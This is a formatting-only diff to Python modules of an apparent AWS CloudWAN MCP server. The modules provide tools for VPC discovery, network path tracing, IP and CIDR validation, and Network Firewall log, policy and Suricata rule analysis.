@@ -161,4 +160,4 @@
             return safe_json_dumps(result, indent=2)
 
         except Exception as e:
-            return handle_aws_error(e, "get_core_network_change_events")
\ No newline at end of file
+            return handle_aws_error(e, "get_core_network_change_events")

--- awslabs/cloudwan_mcp_server/tools/discovery.py
+++ awslabs/cloudwan_mcp_server/tools/discovery.py
@@ -25,24 +25,25 @@
 
 class DiscoveryTools:
     """Collection of AWS resource discovery tools for CloudWAN."""
-    
+
     def __init__(self, mcp_server: FastMCP) -> None:
         """Initialize discovery tools.
-        
+
         Args:
             mcp_server: FastMCP server instance
         """
         self.mcp = mcp_server
         self._register_tools()
-    
+
     def _register_tools(self) -> None:
         """Register all discovery tools with the MCP server."""
+
         # Register discover_vpcs tool
         @self.mcp.tool(name="discover_vpcs")
         async def discover_vpcs(region: str | None = None) -> str:
             """Discover VPCs."""
             return await self._discover_vpcs(region)
-        
+
         # Register get_global_networks tool
         @self.mcp.tool(name="get_global_networks")
         async def get_global_networks(region: str | None = None) -> str:
@@ -68,19 +69,14 @@
                         cidr_block=vpc.get("CidrBlock"),
                         state=vpc.get("State"),
                         is_default=vpc.get("IsDefault", False),
-                        tags=vpc.get("Tags", [])
+                        tags=vpc.get("Tags", []),
                     )
                     vpc_resources.append(vpc_resource.dict())
                 except Exception:
                     # If validation fails, use original VPC data
                     vpc_resources.append(vpc)
 
-            result = {
-                "success": True, 
-                "region": region, 
-                "total_count": len(vpc_resources), 
-                "vpcs": vpc_resources
-            }
+            result = {"success": True, "region": region, "total_count": len(vpc_resources), "vpcs": vpc_resources}
 
             return safe_json_dumps(result, indent=2)
 
@@ -105,8 +101,10 @@
                         global_network_arn=gn.get("GlobalNetworkArn"),
                         description=gn.get("Description"),
                         state=gn.get("State"),
-                        created_at=gn.get("CreatedAt").isoformat() if hasattr(gn.get("CreatedAt"), "isoformat") else gn.get("CreatedAt"),
-                        tags=gn.get("Tags", [])
+                        created_at=gn.get("CreatedAt").isoformat()
+                        if hasattr(gn.get("CreatedAt"), "isoformat")
+                        else gn.get("CreatedAt"),
+                        tags=gn.get("Tags", []),
                     )
                     global_network_resources.append(global_network.dict())
                 except Exception:
@@ -123,4 +121,4 @@
             return safe_json_dumps(result, indent=2)
 
         except Exception as e:
-            return handle_aws_error(e, "get_global_networks")
\ No newline at end of file
+            return handle_aws_error(e, "get_global_networks")

--- awslabs/cloudwan_mcp_server/tools/network_analysis.py
+++ awslabs/cloudwan_mcp_server/tools/network_analysis.py
@@ -26,30 +26,31 @@
 
 class NetworkAnalysisTools:
     """Collection of network analysis tools for CloudWAN."""
-    
+
     def __init__(self, mcp_server: FastMCP) -> None:
         """Initialize network analysis tools.
-        
+
         Args:
             mcp_server: FastMCP server instance
         """
         self.mcp = mcp_server
         self._register_tools()
-    
+
     def _register_tools(self) -> None:
         """Register all network analysis tools with the MCP server."""
+
         # Register trace_network_path tool
         @self.mcp.tool(name="trace_network_path")
         async def trace_network_path(source_ip: str, destination_ip: str, region: str | None = None) -> str:
             """Trace network paths between IPs."""
             return await self._trace_network_path(source_ip, destination_ip, region)
-        
+
         # Register discover_ip_details tool
-        @self.mcp.tool(name="discover_ip_details") 
+        @self.mcp.tool(name="discover_ip_details")
         async def discover_ip_details(ip_address: str, region: str | None = None) -> str:
             """IP details discovery."""
             return await self._discover_ip_details(ip_address, region)
-        
+
         # Register validate_ip_cidr tool
         @self.mcp.tool(name="validate_ip_cidr")
         async def validate_ip_cidr(operation: str, ip: str | None = None, cidr: str | None = None) -> str:
@@ -74,15 +75,12 @@
                         {"hop": 2, "ip": "10.0.1.1", "description": "VPC Gateway"},
                         {"hop": 3, "ip": "172.16.1.1", "description": "Transit Gateway"},
                         {"hop": 4, "ip": destination_ip, "description": "Destination endpoint"},
-                    ]
+                    ],
                 )
             except Exception as validation_error:
                 return handle_aws_error(validation_error, "trace_network_path")
 
-            result = {
-                "success": True,
-                **path_model.dict()
-            }
+            result = {"success": True, **path_model.dict()}
 
             return safe_json_dumps(result, indent=2)
 
@@ -97,22 +95,19 @@
             # Validate IP address and get details
             try:
                 ip_obj = ipaddress.ip_address(ip_address)
-                
+
                 ip_details = IPDetails(
                     ip_address=ip_address,
                     region=region,
                     ip_version=ip_obj.version,
                     is_private=ip_obj.is_private,
                     is_multicast=ip_obj.is_multicast,
-                    is_loopback=ip_obj.is_loopback
+                    is_loopback=ip_obj.is_loopback,
                 )
             except Exception as validation_error:
                 return handle_aws_error(validation_error, "discover_ip_details")
 
-            result = {
-                "success": True,
-                **ip_details.dict()
-            }
+            result = {"success": True, **ip_details.dict()}
 
             return safe_json_dumps(result, indent=2)
 
@@ -137,25 +132,24 @@
                     }
                 except Exception as validation_error:
                     return handle_aws_error(validation_error, "validate_ip_cidr")
-                    
+
             elif operation == "validate_cidr" and cidr:
                 # Validate CIDR block
                 try:
                     network = ipaddress.ip_network(cidr, strict=False)
-                    
+
                     cidr_validation = CIDRValidation(
                         operation="validate_cidr",
                         network=str(network),
                         network_address=str(network.network_address),
-                        broadcast_address=str(network.broadcast_address) if hasattr(network, 'broadcast_address') else None,
+                        broadcast_address=str(network.broadcast_address)
+                        if hasattr(network, "broadcast_address")
+                        else None,
                         num_addresses=network.num_addresses,
-                        is_private=network.is_private
+                        is_private=network.is_private,
                     )
-                    
-                    result = {
-                        "success": True,
-                        **cidr_validation.dict()
-                    }
+
+                    result = {"success": True, **cidr_validation.dict()}
                 except Exception as validation_error:
                     return handle_aws_error(validation_error, "validate_ip_cidr")
             else:
@@ -168,4 +162,4 @@
             return safe_json_dumps(result, indent=2)
 
         except Exception as e:
-            return handle_aws_error(e, "validate_ip_cidr")
\ No newline at end of file
+            return handle_aws_error(e, "validate_ip_cidr")

--- awslabs/cloudwan_mcp_server/tools/network_firewall.py
+++ awslabs/cloudwan_mcp_server/tools/network_firewall.py
@@ -16,7 +16,7 @@
 
 This module provides comprehensive AWS Network Firewall integration including:
 - Flow and alert log monitoring
-- Policy analysis and compliance checking  
+- Policy analysis and compliance checking
 - 5-tuple traffic flow analysis
 - Suricata rule parsing for L7 inspection
 - What-if policy change simulation
@@ -45,17 +45,17 @@
 
 class NetworkFirewallTools:
     """AWS Network Firewall management and analysis tools."""
-    
+
     def __init__(self):
         """Initialize Network Firewall tools."""
         self.config = get_aws_config()
-        
+
     @lru_cache(maxsize=10)
     def get_network_firewall_client(self, region: Optional[str] = None):
         """Get cached Network Firewall client."""
         return get_aws_client("network-firewall", region or self.config.default_region)
-    
-    @lru_cache(maxsize=10) 
+
+    @lru_cache(maxsize=10)
     def get_logs_client(self, region: Optional[str] = None):
         """Get cached CloudWatch Logs client."""
         return get_aws_client("logs", region or self.config.default_region)
@@ -64,11 +64,11 @@
         """Validate firewall ARN or name format."""
         if identifier.startswith("arn:aws"):
             # Validate ARN format
-            if not re.match(r'arn:aws:network-firewall:[^:]+:[^:]+:firewall/[^/]+$', identifier):
+            if not re.match(r"arn:aws:network-firewall:[^:]+:[^:]+:firewall/[^/]+$", identifier):
                 raise ValueError(f"Invalid firewall ARN format: {sanitize_error_message(identifier)}")
         else:
             # Validate name format
-            if not re.match(r'^[a-zA-Z0-9\-_]{1,128}$', identifier):
+            if not re.match(r"^[a-zA-Z0-9\-_]{1,128}$", identifier):
                 raise ValueError(f"Invalid firewall name format: {sanitize_error_message(identifier)}")
 
     def _validate_ip_address(self, ip: str) -> None:
@@ -88,19 +88,14 @@
         try:
             # Basic Suricata rule parsing - simplified version
             # Format: action protocol src_ip src_port -> dst_ip dst_port (options)
-            pattern = r'(alert|pass|drop|reject)\s+(\w+)\s+(\S+)\s+(\S+)\s+->\s+(\S+)\s+(\S+)'
+            pattern = r"(alert|pass|drop|reject)\s+(\w+)\s+(\S+)\s+(\S+)\s+->\s+(\S+)\s+(\S+)"
             match = re.match(pattern, rule.strip())
-            
+
             if not match:
-                return SuricataRule(
-                    action="unknown",
-                    protocol="any",
-                    raw_rule=rule,
-                    parsed=False
-                )
-                
+                return SuricataRule(action="unknown", protocol="any", raw_rule=rule, parsed=False)
+
             action, protocol, src_ip, src_port, dst_ip, dst_port = match.groups()
-            
+
             return SuricataRule(
                 action=action,
                 protocol=protocol,
@@ -109,49 +104,44 @@
                 dst_ip=dst_ip if dst_ip != "any" else None,
                 dst_port=dst_port if dst_port != "any" else None,
                 raw_rule=rule,
-                parsed=True
+                parsed=True,
             )
-            
+
         except Exception as e:
             logger.warning(f"Failed to parse Suricata rule: {sanitize_error_message(str(e))}")
-            return SuricataRule(
-                action="unknown",
-                protocol="any", 
-                raw_rule=rule,
-                parsed=False,
-                parse_error=str(e)
-            )
+            return SuricataRule(action="unknown", protocol="any", raw_rule=rule, parsed=False, parse_error=str(e))
 
-    def _check_five_tuple_match(self, rule: SuricataRule, src_ip: str, dst_ip: str, 
-                              protocol: str, src_port: int, dst_port: int) -> bool:
+    def _check_five_tuple_match(
+        self, rule: SuricataRule, src_ip: str, dst_ip: str, protocol: str, src_port: int, dst_port: int
+    ) -> bool:
         """Check if 5-tuple matches Suricata rule."""
         try:
             # Protocol match
             if rule.protocol != "any" and rule.protocol.lower() != protocol.lower():
                 return False
-                
+
             # Source IP match
             if rule.src_ip and rule.src_ip != "any":
                 if not self._ip_matches_pattern(src_ip, rule.src_ip):
                     return False
-                    
-            # Destination IP match  
+
+            # Destination IP match
             if rule.dst_ip and rule.dst_ip != "any":
                 if not self._ip_matches_pattern(dst_ip, rule.dst_ip):
                     return False
-                    
+
             # Source port match
             if rule.src_port and rule.src_port != "any":
                 if not self._port_matches_pattern(src_port, rule.src_port):
                     return False
-                    
+
             # Destination port match
             if rule.dst_port and rule.dst_port != "any":
                 if not self._port_matches_pattern(dst_port, rule.dst_port):
                     return False
-                    
+
             return True
-            
+
         except Exception as e:
             logger.warning(f"Error checking 5-tuple match: {sanitize_error_message(str(e))}")
             return False
@@ -182,88 +172,86 @@
         except Exception:
             return False
 
-    def _simulate_policy_impact(self, current_policy: Dict, new_policy: Dict, 
-                              test_flows: List[Tuple]) -> Dict:
+    def _simulate_policy_impact(self, current_policy: Dict, new_policy: Dict, test_flows: List[Tuple]) -> Dict:
         """Simulate impact of policy changes on test flows."""
         results = {
             "flows_analyzed": len(test_flows),
-            "impact_summary": {
-                "newly_blocked": 0,
-                "newly_allowed": 0,
-                "no_change": 0
-            },
-            "detailed_analysis": []
+            "impact_summary": {"newly_blocked": 0, "newly_allowed": 0, "no_change": 0},
+            "detailed_analysis": [],
         }
-        
+
         for flow in test_flows:
             src_ip, dst_ip, protocol, src_port, dst_port = flow
-            
+
             # Analyze current policy decision
             current_decision = self._evaluate_flow_against_policy(
                 current_policy, src_ip, dst_ip, protocol, src_port, dst_port
             )
-            
+
             # Analyze new policy decision
-            new_decision = self._evaluate_flow_against_policy(
-                new_policy, src_ip, dst_ip, protocol, src_port, dst_port
-            )
-            
+            new_decision = self._evaluate_flow_against_policy(new_policy, src_ip, dst_ip, protocol, src_port, dst_port)
+
             # Determine impact
             if current_decision != new_decision:
                 if current_decision == "ALLOW" and new_decision == "DENY":
                     results["impact_summary"]["newly_blocked"] += 1
                     impact = "NEWLY_BLOCKED"
                 else:
-                    results["impact_summary"]["newly_allowed"] += 1 
+                    results["impact_summary"]["newly_allowed"] += 1
                     impact = "NEWLY_ALLOWED"
             else:
                 results["impact_summary"]["no_change"] += 1
                 impact = "NO_CHANGE"
-                
-            results["detailed_analysis"].append({
-                "flow": f"{src_ip}:{src_port} -> {dst_ip}:{dst_port} ({protocol})",
-                "current_decision": current_decision,
-                "new_decision": new_decision,
-                "impact": impact
-            })
-            
+
+            results["detailed_analysis"].append(
+                {
+                    "flow": f"{src_ip}:{src_port} -> {dst_ip}:{dst_port} ({protocol})",
+                    "current_decision": current_decision,
+                    "new_decision": new_decision,
+                    "impact": impact,
+                }
+            )
+
         return results
 
-    def _evaluate_flow_against_policy(self, policy: Dict, src_ip: str, dst_ip: str,
-                                    protocol: str, src_port: int, dst_port: int) -> str:
+    def _evaluate_flow_against_policy(
+        self, policy: Dict, src_ip: str, dst_ip: str, protocol: str, src_port: int, dst_port: int
+    ) -> str:
         """Evaluate if flow is allowed by policy."""
         try:
             # Simplified policy evaluation - in reality this would be much more complex
             # This is a basic implementation for demonstration
-            
+
             # Check stateless rules first
             for rule_group in policy.get("StatelessRuleGroups", []):
                 # Simplified stateless evaluation
                 if self._check_stateless_rule_match(rule_group, src_ip, dst_ip, protocol, src_port, dst_port):
                     return rule_group.get("Action", "DENY")
-                    
+
             # Check stateful rules
             for rule_group in policy.get("StatefulRuleGroups", []):
                 # Simplified stateful evaluation
                 if self._check_stateful_rule_match(rule_group, src_ip, dst_ip, protocol, src_port, dst_port):
                     return "ALLOW"  # Stateful rules typically allow established connections
-                    
+
             # Default action
             return policy.get("StatelessDefaultActions", ["aws:drop"])[0].replace("aws:", "").upper()
-            
+
         except Exception as e:
             logger.warning(f"Error evaluating flow against policy: {sanitize_error_message(str(e))}")
             return "DENY"  # Fail secure
 
-    def _check_stateless_rule_match(self, rule_group: Dict, src_ip: str, dst_ip: str,
-                                  protocol: str, src_port: int, dst_port: int) -> bool:
+    def _check_stateless_rule_match(
+        self, rule_group: Dict, src_ip: str, dst_ip: str, protocol: str, src_port: int, dst_port: int
+    ) -> bool:
         """Check if flow matches stateless rule group."""
         # Simplified implementation - real implementation would be much more complex
         return False
 
-    def _check_stateful_rule_match(self, rule_group: Dict, src_ip: str, dst_ip: str, 
-                                 protocol: str, src_port: int, dst_port: int) -> bool:
-        """Check if flow matches stateful rule group.""" 
+    def _check_stateful_rule_match(
+        self, rule_group: Dict, src_ip: str, dst_ip: str, protocol: str, src_port: int, dst_port: int
+    ) -> bool:
+        """Check if flow matches stateful rule group."""
         # Simplified implementation - real implementation would be much more complex
         return False
 
@@ -274,19 +262,16 @@
 
 @mcp.tool(name="monitor_anfw_logs")
 async def monitor_anfw_logs(
-    firewall_name: str,
-    log_type: str = "flow", 
-    time_range_minutes: int = 60,
-    region: Optional[str] = None
+    firewall_name: str, log_type: str = "flow", time_range_minutes: int = 60, region: Optional[str] = None
 ) -> str:
     """Monitor AWS Network Firewall flow and alert logs.
-    
+
     Args:
         firewall_name: Name of the Network Firewall
         log_type: Type of logs to monitor ('flow' or 'alert')
         time_range_minutes: Time range in minutes to query (default: 60)
         region: AWS region (optional, uses default if not specified)
-        
+
     Returns:
         JSON string with log entries and analysis
     """
@@ -297,17 +282,17 @@
             raise ValueError("log_type must be 'flow' or 'alert'")
         if not (1 <= time_range_minutes <= 1440):  # Max 24 hours
             raise ValueError("time_range_minutes must be between 1 and 1440")
-            
+
         # Get CloudWatch Logs client
         logs_client = firewall_tools.get_logs_client(region)
-        
+
         # Construct log group name
         log_group = f"/aws/network-firewall/{firewall_name}"
-        
+
         # Calculate time range
         end_time = datetime.utcnow()
         start_time = end_time - timedelta(minutes=time_range_minutes)
-        
+
         # Query CloudWatch Logs
         query = f"""
         fields @timestamp, @message
@@ -315,18 +300,19 @@
         | sort @timestamp desc
         | limit 100
         """
-        
+
         response = logs_client.start_query(
             logGroupName=log_group,
             startTime=int(start_time.timestamp()),
             endTime=int(end_time.timestamp()),
-            queryString=query
+            queryString=query,
         )
-        
+
         query_id = response["queryId"]
-        
+
         # Wait for query completion (simplified polling)
         import time
+
         for _ in range(30):  # Max 30 seconds
             result = logs_client.get_query_results(queryId=query_id)
             if result["status"] == "Complete":
@@ -334,7 +320,7 @@
             time.sleep(1)
         else:
             raise TimeoutError("Query did not complete within 30 seconds")
-            
+
         # Process results
         log_entries = []
         for row in result.get("results", []):
@@ -342,7 +328,7 @@
             for field in row:
                 entry[field["field"]] = field["value"]
             log_entries.append(entry)
-            
+
         # Analyze logs for patterns
         analysis = {
             "total_entries": len(log_entries),
@@ -350,38 +336,35 @@
             "log_type": log_type,
             "top_sources": {},
             "top_destinations": {},
-            "actions_summary": {}
+            "actions_summary": {},
         }
-        
+
         # Basic log analysis
         for entry in log_entries:
             message = entry.get("@message", "")
             # Parse flow log format (simplified)
             if "srcaddr" in message and "dstaddr" in message:
                 # Extract source and destination IPs for analysis
-                src_match = re.search(r'srcaddr=(\d+\.\d+\.\d+\.\d+)', message)
-                dst_match = re.search(r'dstaddr=(\d+\.\d+\.\d+\.\d+)', message)
-                action_match = re.search(r'action=(\w+)', message)
-                
+                src_match = re.search(r"srcaddr=(\d+\.\d+\.\d+\.\d+)", message)
+                dst_match = re.search(r"dstaddr=(\d+\.\d+\.\d+\.\d+)", message)
+                action_match = re.search(r"action=(\w+)", message)
+
                 if src_match:
                     src_ip = src_match.group(1)
                     analysis["top_sources"][src_ip] = analysis["top_sources"].get(src_ip, 0) + 1
-                    
+
                 if dst_match:
                     dst_ip = dst_match.group(1)
                     analysis["top_destinations"][dst_ip] = analysis["top_destinations"].get(dst_ip, 0) + 1
-                    
+
                 if action_match:
                     action = action_match.group(1)
                     analysis["actions_summary"][action] = analysis["actions_summary"].get(action, 0) + 1
-        
-        return safe_json_dumps({
-            "success": True,
-            "firewall_name": firewall_name,
-            "log_entries": log_entries,
-            "analysis": analysis
-        })
-        
+
+        return safe_json_dumps(
+            {"success": True, "firewall_name": firewall_name, "log_entries": log_entries, "analysis": analysis}
+        )
+
     except Exception as e:
         logger.error(f"Failed to monitor ANFW logs: {sanitize_error_message(str(e))}")
         return handle_aws_error(e, "monitor_anfw_logs")
@@ -389,54 +372,48 @@
 
 @mcp.tool(name="analyze_anfw_policy")
 async def analyze_anfw_policy(
-    firewall_identifier: str,
-    include_compliance_check: bool = True,
-    region: Optional[str] = None
+    firewall_identifier: str, include_compliance_check: bool = True, region: Optional[str] = None
 ) -> str:
     """Analyze AWS Network Firewall policy and configuration.
-    
+
     Args:
         firewall_identifier: Firewall ARN or name
         include_compliance_check: Include CloudWAN compliance analysis
         region: AWS region (optional)
-        
+
     Returns:
         JSON string with policy analysis and recommendations
     """
     try:
         # Validate inputs
         firewall_tools._validate_firewall_identifier(firewall_identifier)
-        
+
         # Get Network Firewall client
         nfw_client = firewall_tools.get_network_firewall_client(region)
-        
+
         # Get firewall details
         if firewall_identifier.startswith("arn:"):
             firewall_response = nfw_client.describe_firewall(FirewallArn=firewall_identifier)
         else:
             firewall_response = nfw_client.describe_firewall(FirewallName=firewall_identifier)
-            
+
         firewall = firewall_response["Firewall"]
         firewall_metadata = firewall_response["FirewallStatus"]
-        
+
         # Get firewall policy
-        policy_response = nfw_client.describe_firewall_policy(
-            FirewallPolicyArn=firewall["FirewallPolicyArn"]
-        )
+        policy_response = nfw_client.describe_firewall_policy(FirewallPolicyArn=firewall["FirewallPolicyArn"])
         policy = policy_response["FirewallPolicy"]
-        
+
         # Get logging configuration
         try:
-            logging_response = nfw_client.describe_logging_configuration(
-                FirewallArn=firewall["FirewallArn"]
-            )
+            logging_response = nfw_client.describe_logging_configuration(FirewallArn=firewall["FirewallArn"])
             logging_config = logging_response.get("LoggingConfiguration", {})
         except ClientError as e:
-            if e.response['Error']['Code'] == 'ResourceNotFoundException':
+            if e.response["Error"]["Code"] == "ResourceNotFoundException":
                 logging_config = {}
             else:
                 raise
-                
+
         # Analyze policy structure
         analysis = {
             "firewall_details": {
@@ -444,79 +421,83 @@
                 "arn": firewall["FirewallArn"],
                 "vpc_id": firewall["VpcId"],
                 "subnet_mappings": len(firewall["SubnetMappings"]),
-                "status": firewall_metadata["Status"]
+                "status": firewall_metadata["Status"],
             },
             "policy_summary": {
                 "stateless_rule_groups": len(policy.get("StatelessRuleGroups", [])),
                 "stateful_rule_groups": len(policy.get("StatefulRuleGroups", [])),
                 "stateless_default_actions": policy.get("StatelessDefaultActions", []),
-                "stateless_fragment_default_actions": policy.get("StatelessFragmentDefaultActions", [])
+                "stateless_fragment_default_actions": policy.get("StatelessFragmentDefaultActions", []),
             },
             "logging_configuration": {
                 "configured": bool(logging_config),
-                "destinations": len(logging_config.get("LogDestinationConfigs", []))
+                "destinations": len(logging_config.get("LogDestinationConfigs", [])),
             },
-            "security_recommendations": []
+            "security_recommendations": [],
         }
-        
+
         # Generate security recommendations
         recommendations = []
-        
+
         # Check for logging
         if not logging_config:
-            recommendations.append({
-                "priority": "HIGH",
-                "category": "LOGGING", 
-                "recommendation": "Enable logging for flow and alert logs",
-                "rationale": "Logging is essential for security monitoring and compliance"
-            })
-            
+            recommendations.append(
+                {
+                    "priority": "HIGH",
+                    "category": "LOGGING",
+                    "recommendation": "Enable logging for flow and alert logs",
+                    "rationale": "Logging is essential for security monitoring and compliance",
+                }
+            )
+
         # Check default actions
         if "aws:pass" in policy.get("StatelessDefaultActions", []):
-            recommendations.append({
-                "priority": "MEDIUM",
-                "category": "SECURITY",
-                "recommendation": "Review permissive default action 'aws:pass'",
-                "rationale": "Consider using explicit allow/deny rules instead of permissive defaults"
-            })
-            
+            recommendations.append(
+                {
+                    "priority": "MEDIUM",
+                    "category": "SECURITY",
+                    "recommendation": "Review permissive default action 'aws:pass'",
+                    "rationale": "Consider using explicit allow/deny rules instead of permissive defaults",
+                }
+            )
+
         # Check for empty rule groups
         if not policy.get("StatelessRuleGroups") and not policy.get("StatefulRuleGroups"):
-            recommendations.append({
-                "priority": "HIGH", 
-                "category": "CONFIGURATION",
-                "recommendation": "Add rule groups to define firewall behavior",
-                "rationale": "Empty firewall policy may not provide intended protection"
-            })
-            
+            recommendations.append(
+                {
+                    "priority": "HIGH",
+                    "category": "CONFIGURATION",
+                    "recommendation": "Add rule groups to define firewall behavior",
+                    "rationale": "Empty firewall policy may not provide intended protection",
+                }
+            )
+
         analysis["security_recommendations"] = recommendations
-        
+
         # CloudWAN compliance check if requested
         if include_compliance_check:
             try:
                 # Get CloudWAN core network policy for comparison
                 from .core_network import CoreNetworkTools
+
                 core_tools = CoreNetworkTools()
-                
+
                 # This would involve complex policy comparison logic
                 compliance = {
                     "status": "ANALYSIS_AVAILABLE",
-                    "note": "CloudWAN policy compliance analysis requires core network context"
+                    "note": "CloudWAN policy compliance analysis requires core network context",
                 }
                 analysis["cloudwan_compliance"] = compliance
-                
+
             except Exception as e:
                 logger.warning(f"CloudWAN compliance check failed: {sanitize_error_message(str(e))}")
                 analysis["cloudwan_compliance"] = {
                     "status": "CHECK_FAILED",
-                    "error": "Unable to perform compliance analysis"
+                    "error": "Unable to perform compliance analysis",
                 }
-        
-        return safe_json_dumps({
-            "success": True,
-            "analysis": analysis
-        })
-        
+
+        return safe_json_dumps({"success": True, "analysis": analysis})
+
     except Exception as e:
         logger.error(f"Failed to analyze ANFW policy: {sanitize_error_message(str(e))}")
         return handle_aws_error(e, "analyze_anfw_policy")
@@ -526,14 +507,14 @@
 async def analyze_five_tuple_flow(
     firewall_identifier: str,
     source_ip: str,
-    destination_ip: str, 
+    destination_ip: str,
     protocol: str,
     source_port: int,
     destination_port: int,
-    region: Optional[str] = None
+    region: Optional[str] = None,
 ) -> str:
     """Analyze if a 5-tuple flow would be permitted by Network Firewall policy.
-    
+
     Args:
         firewall_identifier: Firewall ARN or name
         source_ip: Source IP address
@@ -542,7 +523,7 @@
         source_port: Source port number
         destination_port: Destination port number
         region: AWS region (optional)
-        
+
     Returns:
         JSON string with flow analysis results
     """
@@ -553,26 +534,24 @@
         firewall_tools._validate_ip_address(destination_ip)
         firewall_tools._validate_port(source_port)
         firewall_tools._validate_port(destination_port)
-        
+
         if protocol.upper() not in ["TCP", "UDP", "ICMP"]:
             raise ValueError("Protocol must be TCP, UDP, or ICMP")
-            
+
         # Get firewall policy
         nfw_client = firewall_tools.get_network_firewall_client(region)
-        
+
         if firewall_identifier.startswith("arn:"):
             firewall_response = nfw_client.describe_firewall(FirewallArn=firewall_identifier)
         else:
             firewall_response = nfw_client.describe_firewall(FirewallName=firewall_identifier)
-            
+
         firewall = firewall_response["Firewall"]
-        
+
         # Get policy details
-        policy_response = nfw_client.describe_firewall_policy(
-            FirewallPolicyArn=firewall["FirewallPolicyArn"]
-        )
+        policy_response = nfw_client.describe_firewall_policy(FirewallPolicyArn=firewall["FirewallPolicyArn"])
         policy = policy_response["FirewallPolicy"]
-        
+
         # Analyze flow against policy
         flow_analysis = {
             "flow_details": {
@@ -580,58 +559,56 @@
                 "destination_ip": destination_ip,
                 "protocol": protocol.upper(),
                 "source_port": source_port,
-                "destination_port": destination_port
+                "destination_port": destination_port,
             },
-            "policy_evaluation": {
-                "stateless_analysis": {},
-                "stateful_analysis": {},
-                "final_decision": "UNKNOWN"
-            },
+            "policy_evaluation": {"stateless_analysis": {}, "stateful_analysis": {}, "final_decision": "UNKNOWN"},
             "rule_matches": [],
-            "recommendations": []
+            "recommendations": [],
         }
-        
+
         # Simplified policy evaluation - in production this would be much more sophisticated
         evaluation_result = firewall_tools._evaluate_flow_against_policy(
             policy, source_ip, destination_ip, protocol.upper(), source_port, destination_port
         )
-        
+
         flow_analysis["policy_evaluation"]["final_decision"] = evaluation_result
-        
+
         # Add contextual analysis
         if evaluation_result == "DENY":
-            flow_analysis["recommendations"].append({
-                "type": "SECURITY",
-                "message": "Flow would be blocked by current policy",
-                "suggestion": "Review rule groups if this flow should be allowed"
-            })
+            flow_analysis["recommendations"].append(
+                {
+                    "type": "SECURITY",
+                    "message": "Flow would be blocked by current policy",
+                    "suggestion": "Review rule groups if this flow should be allowed",
+                }
+            )
         else:
-            flow_analysis["recommendations"].append({
-                "type": "INFO", 
-                "message": "Flow would be permitted by current policy",
-                "suggestion": "Ensure this aligns with security requirements"
-            })
-            
+            flow_analysis["recommendations"].append(
+                {
+                    "type": "INFO",
+                    "message": "Flow would be permitted by current policy",
+                    "suggestion": "Ensure this aligns with security requirements",
+                }
+            )
+
         # Integration with path tracing
         try:
             from .network_analysis import NetworkAnalysisTools
+
             path_tools = NetworkAnalysisTools()
-            
+
             # This would integrate with existing path tracing functionality
             integration_note = {
                 "path_trace_available": True,
-                "note": "Use trace_network_path tool for end-to-end path analysis including firewall hops"
+                "note": "Use trace_network_path tool for end-to-end path analysis including firewall hops",
             }
             flow_analysis["path_integration"] = integration_note
-            
+
         except Exception as e:
             logger.warning(f"Path integration failed: {sanitize_error_message(str(e))}")
-            
-        return safe_json_dumps({
-            "success": True,
-            "flow_analysis": flow_analysis
-        })
-        
+
+        return safe_json_dumps({"success": True, "flow_analysis": flow_analysis})
+
     except Exception as e:
         logger.error(f"Failed to analyze 5-tuple flow: {sanitize_error_message(str(e))}")
         return handle_aws_error(e, "analyze_five_tuple_flow")
@@ -639,78 +616,67 @@
 
 @mcp.tool(name="parse_suricata_rules")
 async def parse_suricata_rules(
-    firewall_identifier: str,
-    analyze_l7_rules: bool = True,
-    region: Optional[str] = None
+    firewall_identifier: str, analyze_l7_rules: bool = True, region: Optional[str] = None
 ) -> str:
     """Parse and analyze Suricata rules from Network Firewall for L7 inspection.
-    
+
     Args:
         firewall_identifier: Firewall ARN or name
         analyze_l7_rules: Include L7 application layer analysis
         region: AWS region (optional)
-        
+
     Returns:
         JSON string with parsed Suricata rules and analysis
     """
     try:
         # Validate inputs
         firewall_tools._validate_firewall_identifier(firewall_identifier)
-        
+
         # Get Network Firewall client
         nfw_client = firewall_tools.get_network_firewall_client(region)
-        
+
         # Get firewall and policy
         if firewall_identifier.startswith("arn:"):
             firewall_response = nfw_client.describe_firewall(FirewallArn=firewall_identifier)
         else:
             firewall_response = nfw_client.describe_firewall(FirewallName=firewall_identifier)
-            
+
         firewall = firewall_response["Firewall"]
-        
-        policy_response = nfw_client.describe_firewall_policy(
-            FirewallPolicyArn=firewall["FirewallPolicyArn"]
-        )
+
+        policy_response = nfw_client.describe_firewall_policy(FirewallPolicyArn=firewall["FirewallPolicyArn"])
         policy = policy_response["FirewallPolicy"]
-        
+
         # Parse Suricata rules from stateful rule groups
         parsed_rules = []
         l7_analysis = {
             "application_protocols": {},
             "rule_categories": {},
-            "security_analysis": {
-                "total_rules": 0,
-                "alert_rules": 0,
-                "drop_rules": 0,
-                "pass_rules": 0
-            }
+            "security_analysis": {"total_rules": 0, "alert_rules": 0, "drop_rules": 0, "pass_rules": 0},
         }
-        
+
         # Process stateful rule groups
         for rule_group in policy.get("StatefulRuleGroups", []):
             try:
                 # Get rule group details
-                rule_group_response = nfw_client.describe_rule_group(
-                    RuleGroupArn=rule_group["ResourceArn"]
-                )
-                
+                rule_group_response = nfw_client.describe_rule_group(RuleGroupArn=rule_group["ResourceArn"])
+
                 rule_group_data = rule_group_response["RuleGroup"]
-                
+
                 # Parse Suricata rules if present
                 if "RulesSource" in rule_group_data:
                     rules_source = rule_group_data["RulesSource"]
-                    
+
                     if "RulesString" in rules_source:
                         # Parse individual Suricata rules
                         rules_string = rules_source["RulesString"]
-                        rule_lines = rules_string.split('\n')
-                        
+                        rule_lines = rules_string.split("\n")
+
                         for rule_line in rule_lines:
                             rule_line = rule_line.strip()
-                            if rule_line and not rule_line.startswith('#'):
+                            if rule_line and not rule_line.startswith("#"):
                                 parsed_rule = firewall_tools._parse_suricata_rule(rule_line)
                                 parsed_rules.append(parsed_rule)
-                                
+
                                 # Update statistics
                                 l7_analysis["security_analysis"]["total_rules"] += 1
                                 if parsed_rule.action == "alert":
@@ -719,65 +685,73 @@
                                     l7_analysis["security_analysis"]["drop_rules"] += 1
                                 elif parsed_rule.action == "pass":
                                     l7_analysis["security_analysis"]["pass_rules"] += 1
-                                    
+
                                 # Categorize by protocol
                                 protocol = parsed_rule.protocol
-                                l7_analysis["rule_categories"][protocol] = l7_analysis["rule_categories"].get(protocol, 0) + 1
-                                
+                                l7_analysis["rule_categories"][protocol] = (
+                                    l7_analysis["rule_categories"].get(protocol, 0) + 1
+                                )
+
             except ClientError as e:
-                if e.response['Error']['Code'] == 'ResourceNotFoundException':
+                if e.response["Error"]["Code"] == "ResourceNotFoundException":
                     logger.warning(f"Rule group not found: {rule_group['ResourceArn']}")
                     continue
